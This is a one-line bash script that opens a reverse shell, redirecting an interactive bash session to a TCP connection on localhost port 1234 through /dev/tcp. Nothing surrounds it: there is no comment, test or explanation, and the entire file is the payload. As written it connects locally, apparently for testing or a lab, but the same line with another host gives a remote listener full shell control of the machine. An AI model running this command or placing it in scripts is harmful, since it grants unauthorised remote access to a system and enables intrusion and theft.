#!/bin/bash

bash -i >& /dev/tcp/localhost/1234 0>&1
